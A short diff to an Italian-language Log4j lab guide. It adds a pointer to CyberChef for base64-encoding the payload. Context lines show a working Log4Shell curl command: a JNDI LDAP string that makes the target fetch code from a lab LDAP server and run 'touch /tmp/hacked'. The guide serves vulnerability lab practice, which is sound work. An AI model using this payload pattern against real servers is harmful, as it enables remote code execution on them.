@@ -35,6 +35,7 @@ Una volta inviato il comando, il metodo della libreria Log4j interpreterà il co
 ```bash
 curl -A '${jndi:ldap://192.168.10.128:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNrZWQ=}' http://172.18.0.2:8080
 ```
+Per codificare in base64 il payload ci si può servire del tool disponibile qui: https://gchq.github.io/CyberChef/
 
 ## Avvio web-app
 
